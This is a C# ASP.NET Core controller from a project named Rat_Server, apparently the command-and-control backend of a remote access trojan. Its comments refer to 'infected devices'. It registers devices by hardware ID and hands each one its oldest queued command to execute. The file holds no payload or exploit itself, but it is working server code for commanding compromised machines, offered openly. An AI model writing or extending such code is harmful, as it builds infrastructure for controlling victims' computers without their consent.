using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Rat_Server.Model.Entities;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.Context;

namespace Rat_Server.Controllers
{
    /// <summary>
    /// This Controller is responsible for handling requests that are related to the infected devices.
    /// This does not include requests that require admin permissions. Those can be found in the AdminController.
    /// </summary>
    [Route("api/[controller]")]
    [ApiController]
    public class DeviceController : ControllerBase
    {
        private readonly RatDbContext _context;
        private readonly IConfiguration _config;

        public DeviceController(RatDbContext context, IConfiguration config)
        {
            _context = context;
            _config = config;
        }

        [HttpGet("GetCurrentCommand")]
        [ProducesResponseType(typeof(DeviceCommandDto), StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status204NoContent)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        public ActionResult<DeviceCommandDto> GetCurrentCommand([FromHeader] Guid Hwid)
        {
            // If the client's Hwid isn't registered, send back an Unauthorized status code
            if(_context.Devices.Find(Hwid) == null)
            {
                return StatusCode(StatusCodes.Status401Unauthorized);
            }

            // Retrieve the list of commands for the device and order them by the date they were added
            List<Command> commands = _context.Commands.Where(c => c.Device.Hwid == Hwid).OrderBy(c => c.DateAdded).ToList();
            
            if(commands.Any())
            {
                // The first element of the list is the current command the device needs to execute
                Command command = commands.First();

                return Ok(new DeviceCommandDto {
                    commandId = command.commandId.ToString(),
                    CommandValue = command.CommandValue
                });
            }
            else
            {
                return NoContent();
            }
        }
    }
}
